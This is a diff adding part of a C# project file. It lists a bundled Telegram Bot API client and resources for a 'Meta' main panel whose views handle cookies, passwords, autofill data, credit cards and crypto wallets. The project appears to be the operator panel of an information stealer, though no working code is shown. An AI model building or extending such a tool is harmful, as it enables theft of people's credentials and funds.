+    <Compile Include="Telegram\Bot\Requests\SendAnimationRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendAudioRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendChatActionRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendContactRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendDiceRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendDocumentRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendGameRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendInvoiceRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendLocationRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendMediaGroupRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendMessageRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendPhotoRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendPollRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendStickerRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendVenueRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendVideoNoteRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendVideoRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SendVoiceRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetChatAdministratorCustomTitleRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetChatDescriptionRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetChatPermissionsRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetChatPhotoRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetChatStickerSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetChatTitleRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetGameScoreRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetInlineGameScoreRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetMyCommandsRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetStickerPositionInSetRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetStickerSetThumbRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\SetWebhookRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\StopInlineMessageLiveLocationRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\StopMessageLiveLocationRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\StopPollRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\UnbanChatMemberRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\UnpinAllChatMessagesRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\UnpinChatMessageRequest.cs" />
+    <Compile Include="Telegram\Bot\Requests\UploadStickerFileRequest.cs" />
+    <Compile Include="Telegram\Bot\TelegramBotClient.cs" />
+    <Compile Include="Telegram\Bot\Types\AlbumInputMedia.cs" />
+    <Compile Include="Telegram\Bot\Types\Animation.cs" />
+    <Compile Include="Telegram\Bot\Types\ApiResponse.cs" />
+    <Compile Include="Telegram\Bot\Types\Audio.cs" />
+    <Compile Include="Telegram\Bot\Types\BotCommand.cs" />
+    <Compile Include="Telegram\Bot\Types\CallbackGame.cs" />
+    <Compile Include="Telegram\Bot\Types\CallbackQuery.cs" />
+    <Compile Include="Telegram\Bot\Types\Chat.cs" />
+    <Compile Include="Telegram\Bot\Types\ChatId.cs" />
+    <Compile Include="Telegram\Bot\Types\ChatInviteLink.cs" />
+    <Compile Include="Telegram\Bot\Types\ChatLocation.cs" />
+    <Compile Include="Telegram\Bot\Types\ChatMember.cs" />
+    <Compile Include="Telegram\Bot\Types\ChatMemberUpdated.cs" />
+    <Compile Include="Telegram\Bot\Types\ChatPermissions.cs" />
+    <Compile Include="Telegram\Bot\Types\ChatPhoto.cs" />
+    <Compile Include="Telegram\Bot\Types\ChosenInlineResult.cs" />
+    <Compile Include="Telegram\Bot\Types\Contact.cs" />
+    <Compile Include="Telegram\Bot\Types\Dice.cs" />
+    <Compile Include="Telegram\Bot\Types\Document.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\ChatAction.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\ChatMemberStatus.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\ChatType.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\Emoji.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\FileType.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\MaskPositionPoint.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\MessageEntityType.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\MessageEntityTypeExtensions.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\MessageType.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\ParseMode.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\PollType.cs" />
+    <Compile Include="Telegram\Bot\Types\Enums\UpdateType.cs" />
+    <Compile Include="Telegram\Bot\Types\File.cs" />
+    <Compile Include="Telegram\Bot\Types\FileBase.cs" />
+    <Compile Include="Telegram\Bot\Types\Game.cs" />
+    <Compile Include="Telegram\Bot\Types\GameHighScore.cs" />
+    <Compile Include="Telegram\Bot\Types\IAlbumInputMedia.cs" />
+    <Compile Include="Telegram\Bot\Types\IInputFile.cs" />
+    <Compile Include="Telegram\Bot\Types\IInputMedia.cs" />
+    <Compile Include="Telegram\Bot\Types\IInputMediaThumb.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQuery.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\Abstractions\ICaptionInlineQueryResult.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\Abstractions\IInputMessageContentResult.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\Abstractions\ILocationInlineQueryResult.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\Abstractions\IThumbnailInlineQueryResult.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\Abstractions\IThumbnailUrlInlineQueryResult.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\Abstractions\ITitleInlineQueryResult.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultArticle.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultAudio.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultBase.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultCachedAudio.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultCachedDocument.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultCachedGif.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultCachedMpeg4Gif.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultCachedPhoto.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultCachedSticker.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultCachedVideo.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultCachedVoice.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultContact.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultDocument.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultGame.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultGif.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultLocation.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultMpeg4Gif.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultPhoto.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultType.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultVenue.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultVideo.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InlineQueryResultVoice.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InputContactMessageContent.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InputInvoiceMessageContent.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InputLocationMessageContent.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InputMessageContentBase.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InputTextMessageContent.cs" />
+    <Compile Include="Telegram\Bot\Types\InlineQueryResults\InputVenueMessageContent.cs" />
+    <Compile Include="Telegram\Bot\Types\InputFiles\InputFileStream.cs" />
+    <Compile Include="Telegram\Bot\Types\InputFiles\InputOnlineFile.cs" />
+    <Compile Include="Telegram\Bot\Types\InputFiles\InputTelegramFile.cs" />
+    <Compile Include="Telegram\Bot\Types\InputMedia.cs" />
+    <Compile Include="Telegram\Bot\Types\InputMediaAnimation.cs" />
+    <Compile Include="Telegram\Bot\Types\InputMediaAudio.cs" />
+    <Compile Include="Telegram\Bot\Types\InputMediaBase.cs" />
+    <Compile Include="Telegram\Bot\Types\InputMediaDocument.cs" />
+    <Compile Include="Telegram\Bot\Types\InputMediaPhoto.cs" />
+    <Compile Include="Telegram\Bot\Types\InputMediaVideo.cs" />
+    <Compile Include="Telegram\Bot\Types\Location.cs" />
+    <Compile Include="Telegram\Bot\Types\LoginUrl.cs" />
+    <Compile Include="Telegram\Bot\Types\MaskPosition.cs" />
+    <Compile Include="Telegram\Bot\Types\Message.cs" />
+    <Compile Include="Telegram\Bot\Types\MessageAutoDeleteTimerChanged.cs" />
+    <Compile Include="Telegram\Bot\Types\MessageEntity.cs" />
+    <Compile Include="Telegram\Bot\Types\MessageId.cs" />
+    <Compile Include="Telegram\Bot\Types\Passport\EncryptedCredentials.cs" />
+    <Compile Include="Telegram\Bot\Types\Passport\EncryptedPassportElement.cs" />
+    <Compile Include="Telegram\Bot\Types\Passport\PassportData.cs" />
+    <Compile Include="Telegram\Bot\Types\Passport\PassportFile.cs" />
+    <Compile Include="Telegram\Bot\Types\Payments\Invoice.cs" />
+    <Compile Include="Telegram\Bot\Types\Payments\LabeledPrice.cs" />
+    <Compile Include="Telegram\Bot\Types\Payments\OrderInfo.cs" />
+    <Compile Include="Telegram\Bot\Types\Payments\PreCheckoutQuery.cs" />
+    <Compile Include="Telegram\Bot\Types\Payments\ShippingAddress.cs" />
+    <Compile Include="Telegram\Bot\Types\Payments\ShippingOption.cs" />
+    <Compile Include="Telegram\Bot\Types\Payments\ShippingQuery.cs" />
+    <Compile Include="Telegram\Bot\Types\Payments\SuccessfulPayment.cs" />
+    <Compile Include="Telegram\Bot\Types\PhotoSize.cs" />
+    <Compile Include="Telegram\Bot\Types\Poll.cs" />
+    <Compile Include="Telegram\Bot\Types\PollAnswer.cs" />
+    <Compile Include="Telegram\Bot\Types\PollOption.cs" />
+    <Compile Include="Telegram\Bot\Types\ProximityAlertTriggered.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\ForceReplyMarkup.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\IKeyboardButton.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\InlineKeyboardButton.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\InlineKeyboardMarkup.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\IReplyMarkup.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\KeyboardButton.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\KeyboardButtonPollType.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\ReplyKeyboardMarkup.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\ReplyKeyboardRemove.cs" />
+    <Compile Include="Telegram\Bot\Types\ReplyMarkups\ReplyMarkupBase.cs" />
+    <Compile Include="Telegram\Bot\Types\ResponseParameters.cs" />
+    <Compile Include="Telegram\Bot\Types\Sticker.cs" />
+    <Compile Include="Telegram\Bot\Types\StickerSet.cs" />
+    <Compile Include="Telegram\Bot\Types\Update.cs" />
+    <Compile Include="Telegram\Bot\Types\User.cs" />
+    <Compile Include="Telegram\Bot\Types\UserProfilePhotos.cs" />
+    <Compile Include="Telegram\Bot\Types\Venue.cs" />
+    <Compile Include="Telegram\Bot\Types\Video.cs" />
+    <Compile Include="Telegram\Bot\Types\VideoNote.cs" />
+    <Compile Include="Telegram\Bot\Types\Voice.cs" />
+    <Compile Include="Telegram\Bot\Types\VoiceChatEnded.cs" />
+    <Compile Include="Telegram\Bot\Types\VoiceChatParticipantsInvited.cs" />
+    <Compile Include="Telegram\Bot\Types\VoiceChatScheduled.cs" />
+    <Compile Include="Telegram\Bot\Types\VoiceChatStarted.cs" />
+    <Compile Include="Telegram\Bot\Types\WebhookInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="-" />
+    <EmbeddedResource Include="---" />
+    <EmbeddedResource Include="Meta\MainPanel\Data\UI\PartnerPoster.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Data\UI\TelegramBotSettingsControl.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Properties\Resources.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\AuthFrm.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\AutofillesViewer.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\ChooseBrowserFrm.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\CookieViewer.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\CreateWalletRuleDialog.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\CreditCardViewer.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\ExceptionsViewer.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\FilesViewer.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\LockFrm.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\MergeFilesConfigFrm.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\Old\Actions\MainFrm.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\PassViewer.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\SaveProcessFrm.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\SplashFrm.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\SystemInfoFrm.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\TelegramConfigurator.resources" />
+    <EmbeddedResource Include="Meta\MainPanel\Views\WalletsConfigurator.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="Meta\MainPanel\Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <None Include="Meta\MainPanel\Views\Settings\CompletedTasks.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>CompletedTasks.Designer.cs</LastGenOutput>
+    </None>
+    <None Include="Meta\MainPanel\Views\Settings\SettingsOfPanel.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>SettingsOfPanel.Designer.cs</LastGenOutput>
+    </None>
+    <None Include="Meta\MainPanel\Views\Settings\TableSettings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>TableSettings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
